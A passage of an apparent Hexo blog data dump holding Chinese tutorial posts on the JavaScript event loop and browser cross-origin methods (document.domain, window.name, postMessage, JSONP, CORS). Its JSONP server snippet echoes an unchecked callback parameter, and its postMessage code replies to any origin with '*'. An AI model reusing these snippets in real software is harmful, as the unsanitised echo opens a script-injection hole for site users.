class=\"string\">\"script start\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setTimeout\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"params\">resolve</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Promise\"</span>);</span><br><span class=\"line\">  resolve();</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise1\"</span>);</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise2\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"script end\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>微任务包括 process.nextTick,promise,Object.ovserve,MutationObserve</li>\n<li>宏任务包括 script，setTimeout，setInterval,setImmediate,I/O,UI rendering</li>\n<li>很多人认为微任务一定快于宏任务，其实是错的。因为宏任务中包括了 script，浏览器会执行一个宏任务，接下来有异步代码的话会先执行微任务。</li>\n</ul>\n<h3 id=\"正确的一次-Event-loop-顺序\"><a href=\"#正确的一次-Event-loop-顺序\" class=\"headerlink\" title=\"正确的一次 Event-loop 顺序\"></a>正确的一次 Event-loop 顺序</h3><ul>\n<li>执行同步代码，这属于宏任务</li>\n<li>执行栈为空，查询是否有微任务需要执行</li>\n<li>执行所有微任务</li>\n<li>必要的话渲染 ui</li>\n<li>开始下一轮 event-loop，执行宏任务中的异步代码</li>\n</ul>\n<p>所以宏任务中的异步代码有大量的计算并且需要操作 dom 的话，为了更快的界面响应，我们可以把操作 dom 放入微任务中。思考一下 vue ～</p>\n<h2 id=\"node-中的-event-loop\"><a href=\"#node-中的-event-loop\" class=\"headerlink\" title=\"node 中的 event loop\"></a>node 中的 event loop</h2><blockquote>\n<p>node 中的 event loop （存在于 libuv 中）和浏览器的不一样，分为以下六个阶段，他们会按照顺序反复执行</p>\n</blockquote>\n<h3 id=\"timers\"><a href=\"#timers\" class=\"headerlink\" title=\"timers\"></a>timers</h3><ul>\n<li>会执行 setTimeout 和 setInterval</li>\n<li>一个 timer 指定的事件并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟。</li>\n<li>下限的时间会有个范围</li>\n</ul>\n<h3 id=\"I-O-callbacks\"><a href=\"#I-O-callbacks\" class=\"headerlink\" title=\"I/O callbacks\"></a>I/O callbacks</h3><ul>\n<li>会执行除了 close 事件，定时器和 setImmediat 的回调</li>\n</ul>\n<h3 id=\"idle，prepare\"><a href=\"#idle，prepare\" class=\"headerlink\" title=\"idle，prepare\"></a>idle，prepare</h3><ul>\n<li>idle，prepare 阶段内部实现</li>\n</ul>\n<h3 id=\"poll-阶段\"><a href=\"#poll-阶段\" class=\"headerlink\" title=\"poll 阶段\"></a>poll 阶段</h3><ul>\n<li>poll 阶段很重要，这一阶段中，系统会做两件事情<ul>\n<li>执行到点的定时器</li>\n<li>执行 poll 队列中的事件</li>\n</ul>\n</li>\n<li>如果有别的定时器需要被执行，会回到 timer 阶段执行回调</li>\n</ul>\n<h3 id=\"check-阶段\"><a href=\"#check-阶段\" class=\"headerlink\" title=\"check 阶段\"></a>check 阶段</h3><ul>\n<li>执行 setImmediate</li>\n</ul>\n<h3 id=\"close-callbacks\"><a href=\"#close-callbacks\" class=\"headerlink\" title=\"close callbacks\"></a>close callbacks</h3><ul>\n<li>执行 close 事件</li>\n</ul>\n<h2 id=\"node-中执行顺序举例\"><a href=\"#node-中执行顺序举例\" class=\"headerlink\" title=\"node 中执行顺序举例\"></a>node 中执行顺序举例</h2><ul>\n<li>有些情况下，定时器执行顺序是随机的</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setTimeout\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">setImmediate(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setImmediate\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 这里可能会输出 setTimeout，setImmediate</span></span><br><span class=\"line\"><span class=\"comment\">// 可能也会相反的输出，这取决于性能</span></span><br><span class=\"line\"><span class=\"comment\">// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate</span></span><br><span class=\"line\"><span class=\"comment\">// 否则会执行 setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>有些情况下是一定的</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fs = require(<span class=\"string\">'fs'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fs.readFile(__filename, () =&gt; &#123;</span><br><span class=\"line\">    setTimeout(() =&gt; &#123;</span><br><span class=\"line\">        console.log(<span class=\"string\">'timeout'</span>);</span><br><span class=\"line\">    &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setImmediate(() =&gt; &#123;</span><br><span class=\"line\">        console.log(<span class=\"string\">'immediate'</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 因为 readFile 的回调在 poll 中执行</span></span><br><span class=\"line\"><span class=\"comment\">// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调</span></span><br><span class=\"line\"><span class=\"comment\">// 再去 timer 阶段执行 setTimeout</span></span><br><span class=\"line\"><span class=\"comment\">// 所以以上输出一定是 setImmediate，setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>上面都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"timer1\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Promise</span>.resolve().then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise1\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"timer2\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Promise</span>.resolve().then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise2\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以上代码在浏览器和 node 中打印情况是不同的</span></span><br><span class=\"line\"><span class=\"comment\">// 浏览器中打印 timer1, promise1, timer2, promise2</span></span><br><span class=\"line\"><span class=\"comment\">// node 中打印 timer1, timer2, promise1, promise2</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>node 中的 process.nextTick 会优先于其他微任务执行</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><p>-</p>\n"},{"title":"浅谈前端跨域（一）","date":"2018-05-16T12:14:18.000Z","_content":"\n## 什么是跨域\n\n- 因为有浏览器同源策略限制，当前域名的 js 只能读取同域下的窗口属性\n- 跨域不仅仅是指跨域名。\n- 只要协议，域名，端口有任意不同，都被当作不同的域。\n\n## 解决跨域问题\n\n### 主域相同的跨域\n\n- 如果主域相同，比如 a.com 和 b.a.com，那么可以在 b.a.com 设置\n\n```javascript\ndocument.domain = \"a.com\";\n```\n\n### 完全不同源的跨域（两个页面之间的通信）\n\n#### window.name 跨域（同窗口）\n\n- window 对象有个属性 name，在一个窗口的生命周期内，窗口载入的所有页面都是共享一个 window.name，每个页面对于 window.name 都有读写的权限\n- window.name 是持久存在一个窗口载入过的所有页面中的。\n- window.name 的神奇之处在于 name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改当然就不会变化）\n- 可以支持非常长的 name 值（2mb）\n\n#### window.postMessage（跨窗口）\n\n- html 为了解决这个问题，引入了一个全新的 api，跨文档通信 API，它为 window 对象新增了 postMessage 的方法\n- 允许跨窗口通信，不论这个两个窗口是否同源\n\n```javascript\n//父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法。\nlet popup = window.open(\"http://bbb.com\", \"title\");\npopup.postMessage(\"Hello World!\", \"http://bbb.com\");\n```\n\n- postMessage 的第一个参数是具体的信息内容，第二个参数是接受消息的窗口的源（origin），也可以设置为‘\\*’，表示向所有窗口发送\n- 父窗口和子窗口都可以通过 message 事件，监听对方的消息。message 事件的事件对象 event，有三个属性\n  - event.source:发送消息的窗口\n  - event.origin:消息发向的网址\n  - event.data:消息内容\n\n```javascript\nvar onmessage = function(event) {\n  var data = event.data; //消息\n  var origin = event.origin; //消息来源地址\n  var source = event.source; //源Window对象\n  if (origin == \"http://www.aaa.com\") {\n    console.log(data); //hello world!\n  }\n  source.postMessage(\"Nice to see you!\", \"*\");\n};\nif (typeof window.addEventListener != \"undefined\") {\n  window.addEventListener(\"message\", onmessage, false);\n} else if (typeof window.attachEvent != \"undefined\") {\n  //ie\n  window.attachEvent(\"onmessage\", onmessage);\n}\n```\n","source":"_posts/study-domain-01.md","raw":"---\ntitle: 浅谈前端跨域（一）\ndate: 2018-05-16 20:14:18\ntags: 浏览器\n---\n\n## 什么是跨域\n\n- 因为有浏览器同源策略限制，当前域名的 js 只能读取同域下的窗口属性\n- 跨域不仅仅是指跨域名。\n- 只要协议，域名，端口有任意不同，都被当作不同的域。\n\n## 解决跨域问题\n\n### 主域相同的跨域\n\n- 如果主域相同，比如 a.com 和 b.a.com，那么可以在 b.a.com 设置\n\n```javascript\ndocument.domain = \"a.com\";\n```\n\n### 完全不同源的跨域（两个页面之间的通信）\n\n#### window.name 跨域（同窗口）\n\n- window 对象有个属性 name，在一个窗口的生命周期内，窗口载入的所有页面都是共享一个 window.name，每个页面对于 window.name 都有读写的权限\n- window.name 是持久存在一个窗口载入过的所有页面中的。\n- window.name 的神奇之处在于 name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改当然就不会变化）\n- 可以支持非常长的 name 值（2mb）\n\n#### window.postMessage（跨窗口）\n\n- html 为了解决这个问题，引入了一个全新的 api，跨文档通信 API，它为 window 对象新增了 postMessage 的方法\n- 允许跨窗口通信，不论这个两个窗口是否同源\n\n```javascript\n//父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法。\nlet popup = window.open(\"http://bbb.com\", \"title\");\npopup.postMessage(\"Hello World!\", \"http://bbb.com\");\n```\n\n- postMessage 的第一个参数是具体的信息内容，第二个参数是接受消息的窗口的源（origin），也可以设置为‘\\*’，表示向所有窗口发送\n- 父窗口和子窗口都可以通过 message 事件，监听对方的消息。message 事件的事件对象 event，有三个属性\n  - event.source:发送消息的窗口\n  - event.origin:消息发向的网址\n  - event.data:消息内容\n\n```javascript\nvar onmessage = function(event) {\n  var data = event.data; //消息\n  var origin = event.origin; //消息来源地址\n  var source = event.source; //源Window对象\n  if (origin == \"http://www.aaa.com\") {\n    console.log(data); //hello world!\n  }\n  source.postMessage(\"Nice to see you!\", \"*\");\n};\nif (typeof window.addEventListener != \"undefined\") {\n  window.addEventListener(\"message\", onmessage, false);\n} else if (typeof window.attachEvent != \"undefined\") {\n  //ie\n  window.attachEvent(\"onmessage\", onmessage);\n}\n```\n","slug":"study-domain-01","published":1,"updated":"2018-07-06T07:42:58.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qn002h0iof8nnayk9f","content":"<h2 id=\"什么是跨域\"><a href=\"#什么是跨域\" class=\"headerlink\" title=\"什么是跨域\"></a>什么是跨域</h2><ul>\n<li>因为有浏览器同源策略限制，当前域名的 js 只能读取同域下的窗口属性</li>\n<li>跨域不仅仅是指跨域名。</li>\n<li>只要协议，域名，端口有任意不同，都被当作不同的域。</li>\n</ul>\n<h2 id=\"解决跨域问题\"><a href=\"#解决跨域问题\" class=\"headerlink\" title=\"解决跨域问题\"></a>解决跨域问题</h2><h3 id=\"主域相同的跨域\"><a href=\"#主域相同的跨域\" class=\"headerlink\" title=\"主域相同的跨域\"></a>主域相同的跨域</h3><ul>\n<li>如果主域相同，比如 a.com 和 b.a.com，那么可以在 b.a.com 设置</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"a.com\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"完全不同源的跨域（两个页面之间的通信）\"><a href=\"#完全不同源的跨域（两个页面之间的通信）\" class=\"headerlink\" title=\"完全不同源的跨域（两个页面之间的通信）\"></a>完全不同源的跨域（两个页面之间的通信）</h3><h4 id=\"window-name-跨域（同窗口）\"><a href=\"#window-name-跨域（同窗口）\" class=\"headerlink\" title=\"window.name 跨域（同窗口）\"></a>window.name 跨域（同窗口）</h4><ul>\n<li>window 对象有个属性 name，在一个窗口的生命周期内，窗口载入的所有页面都是共享一个 window.name，每个页面对于 window.name 都有读写的权限</li>\n<li>window.name 是持久存在一个窗口载入过的所有页面中的。</li>\n<li>window.name 的神奇之处在于 name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改当然就不会变化）</li>\n<li>可以支持非常长的 name 值（2mb）</li>\n</ul>\n<h4 id=\"window-postMessage（跨窗口）\"><a href=\"#window-postMessage（跨窗口）\" class=\"headerlink\" title=\"window.postMessage（跨窗口）\"></a>window.postMessage（跨窗口）</h4><ul>\n<li>html 为了解决这个问题，引入了一个全新的 api，跨文档通信 API，它为 window 对象新增了 postMessage 的方法</li>\n<li>允许跨窗口通信，不论这个两个窗口是否同源</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法。</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> popup = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"http://bbb.com\"</span>, <span class=\"string\">\"title\"</span>);</span><br><span class=\"line\">popup.postMessage(<span class=\"string\">\"Hello World!\"</span>, <span class=\"string\">\"http://bbb.com\"</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>postMessage 的第一个参数是具体的信息内容，第二个参数是接受消息的窗口的源（origin），也可以设置为‘*’，表示向所有窗口发送</li>\n<li>父窗口和子窗口都可以通过 message 事件，监听对方的消息。message 事件的事件对象 event，有三个属性<ul>\n<li>event.source:发送消息的窗口</li>\n<li>event.origin:消息发向的网址</li>\n<li>event.data:消息内容</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> data = event.data; <span class=\"comment\">//消息</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> origin = event.origin; <span class=\"comment\">//消息来源地址</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> source = event.source; <span class=\"comment\">//源Window对象</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (origin == <span class=\"string\">\"http://www.aaa.com\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data); <span class=\"comment\">//hello world!</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  source.postMessage(<span class=\"string\">\"Nice to see you!\"</span>, <span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span>.addEventListener != <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"message\"</span>, onmessage, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span>.attachEvent != <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//ie</span></span><br><span class=\"line\">  <span class=\"built_in\">window</span>.attachEvent(<span class=\"string\">\"onmessage\"</span>, onmessage);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"什么是跨域\"><a href=\"#什么是跨域\" class=\"headerlink\" title=\"什么是跨域\"></a>什么是跨域</h2><ul>\n<li>因为有浏览器同源策略限制，当前域名的 js 只能读取同域下的窗口属性</li>\n<li>跨域不仅仅是指跨域名。</li>\n<li>只要协议，域名，端口有任意不同，都被当作不同的域。</li>\n</ul>\n<h2 id=\"解决跨域问题\"><a href=\"#解决跨域问题\" class=\"headerlink\" title=\"解决跨域问题\"></a>解决跨域问题</h2><h3 id=\"主域相同的跨域\"><a href=\"#主域相同的跨域\" class=\"headerlink\" title=\"主域相同的跨域\"></a>主域相同的跨域</h3><ul>\n<li>如果主域相同，比如 a.com 和 b.a.com，那么可以在 b.a.com 设置</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"a.com\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"完全不同源的跨域（两个页面之间的通信）\"><a href=\"#完全不同源的跨域（两个页面之间的通信）\" class=\"headerlink\" title=\"完全不同源的跨域（两个页面之间的通信）\"></a>完全不同源的跨域（两个页面之间的通信）</h3><h4 id=\"window-name-跨域（同窗口）\"><a href=\"#window-name-跨域（同窗口）\" class=\"headerlink\" title=\"window.name 跨域（同窗口）\"></a>window.name 跨域（同窗口）</h4><ul>\n<li>window 对象有个属性 name，在一个窗口的生命周期内，窗口载入的所有页面都是共享一个 window.name，每个页面对于 window.name 都有读写的权限</li>\n<li>window.name 是持久存在一个窗口载入过的所有页面中的。</li>\n<li>window.name 的神奇之处在于 name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改当然就不会变化）</li>\n<li>可以支持非常长的 name 值（2mb）</li>\n</ul>\n<h4 id=\"window-postMessage（跨窗口）\"><a href=\"#window-postMessage（跨窗口）\" class=\"headerlink\" title=\"window.postMessage（跨窗口）\"></a>window.postMessage（跨窗口）</h4><ul>\n<li>html 为了解决这个问题，引入了一个全新的 api，跨文档通信 API，它为 window 对象新增了 postMessage 的方法</li>\n<li>允许跨窗口通信，不论这个两个窗口是否同源</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法。</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> popup = <span class=\"built_in\">window</span>.open(<span class=\"string\">\"http://bbb.com\"</span>, <span class=\"string\">\"title\"</span>);</span><br><span class=\"line\">popup.postMessage(<span class=\"string\">\"Hello World!\"</span>, <span class=\"string\">\"http://bbb.com\"</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>postMessage 的第一个参数是具体的信息内容，第二个参数是接受消息的窗口的源（origin），也可以设置为‘*’，表示向所有窗口发送</li>\n<li>父窗口和子窗口都可以通过 message 事件，监听对方的消息。message 事件的事件对象 event，有三个属性<ul>\n<li>event.source:发送消息的窗口</li>\n<li>event.origin:消息发向的网址</li>\n<li>event.data:消息内容</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> data = event.data; <span class=\"comment\">//消息</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> origin = event.origin; <span class=\"comment\">//消息来源地址</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> source = event.source; <span class=\"comment\">//源Window对象</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (origin == <span class=\"string\">\"http://www.aaa.com\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(data); <span class=\"comment\">//hello world!</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  source.postMessage(<span class=\"string\">\"Nice to see you!\"</span>, <span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span>.addEventListener != <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"message\"</span>, onmessage, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span>.attachEvent != <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//ie</span></span><br><span class=\"line\">  <span class=\"built_in\">window</span>.attachEvent(<span class=\"string\">\"onmessage\"</span>, onmessage);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"浅谈浏览器跨域（二）之最终方案","date":"2018-05-16T13:29:55.000Z","_content":"\n# 单向跨域（一般用来获取数据）\n\n> 上面是两个页面之间的交互，现在是单方面向外面聊天的\n\n## JSONP\n\n> JSON With Padding\n\n* 原理是 html 的 script 标签可以加载并执行其他域的 js 文件。\n* 一般 query 是 callback，当然是其他也是，只不过现在和服务端约定好了，服务队会获取到 req.query.callback 这样\n\n```javascript\n<script type=\"text/javascript\">\n    function dosomething(jsondata){\n        //处理获得的json数据\n    }\n</script>\n<script src=\"http://example.com/data.php?callback=dosomething\"></script>\n\n//服务器\n<?php\n$callback = $_GET['callback'];//得到回调函数名\n$data = array('a','b','c');//要返回的数据\necho $callback.'('.json_encode($data).')';//输出\n?>\n//服务器会返回domething(['a','b','c'])给浏览器，就可以直接执行了\n```\n\n* 优点是兼容性好，并且在请求完毕后可以通过调用 callback 的方法回传结果\n* 缺点是支持 get 请求，传输的数据长度有限制\n* 缺点是错误处理机制不完善，没办法进行错误处理\n* 更主要的缺点是安全问题，如果被不信任的服务使用的时候会很危险，比如，callback 参数恶意添加标签（如 script，造成 xss 漏洞）\n\n## websocket 协议\n\n* 是一种通信协议，使用 ws://和 wss（加密）://\n* 这个协议不实行同源策略，只要服务器支持，就可以\n\n## 通过 CORS 跨域\n\n* Cross-Origin Resource Sharing 跨域资源共享\n* 规定了浏览器应该如何与服务器如何通过，背后的思想是使用自定义的 http 头部让浏览器和服务器沟通，从而决定请求或者响应是成功还是失败\n* 浏览器不能低于 IE10\n* 对于开发者来说 CORS 通信和同源的 ajax 通信没有差别，代码完全一样。浏览器一旦发现 ajax 请求跨域，就会自动添加一些附加的头部信息，有时还会多处一次附加的请求，但是用户不会有感觉\n  > 实现 CORS 通信的关键是服务器，只要服务器实现了 CORS 接口，就可以跨源通信\n\n```javascript\n//相对路径是本源\n<script type=\"text/javascript\">\n  var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"/damonare\",true);\n  xhr.send();\n</script>\n//绝对路径，跨域，无感\n<script type=\"text/javascript\">\n    var xhr = new XMLHttpRequest();\n    xhr.open(\"￼GET\", \"http://segmentfault.com/u/trigkit4/\",true);\n    xhr.send();\n</script>\n```\n\n### 两种请求\n\n> cors 分为两类，简单请求和非简单请求\n\n##### 简单请求\n\n满足下面三个条件，就属于简单请求\n\n* 请求方法是 get，post，head\n* (Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain 中的一种\n* 不会使用自定义请求头（类似于 X-Modified 这种）\n\n###### 基本流程简单\n\n* 请求的话，浏览器直接发出 CORS 请求。具体就是浏览器发现这次请求是简单请求，就主动在头信息之中，增加一个 origin 字段\n\n```javascript\n//让我们看看，在这个场景中，浏览器会发送什么的请求到服务器，而服务器又会返回什么给浏览器：\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130\nMinefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nReferer: http://foo.example/examples/access-control/simpleXSInvocation.html\nOrigin: http://foo.example //该请求来自于 http://foo.exmaple。\n//以上是浏览器发送请求\n\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 00:23:53 GMT\nServer: Apache/2.0.61\nAccess-Control-Allow-Origin: * //这表明服务器接受来自任何站点的跨站请求。如果设置为http://foo.example。其它站点就不能跨站访问 http://bar.other 的资源了。\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: application/xml\n//以上是服务器返回信息给浏览器\n```\n\n###### 服务器返回的与 CORS 有关的字段\n\n> 一般都是以 Access-Control 开头\n\n* Access-Control-Allow-Origin 接受域名的请求，必须的\n* Access-Control-Allow-Credentials 可选，表示允不允许发送 cookie。如果需要发送，浏览器的 ajax 请求要打开 withCredentials 属性（xhr.withCredentials = true;）\n* Access-Control-Expose-Headers 可选。因为 cors 请求，xhr 对象的 getResponseHeader()方法只能拿到 6 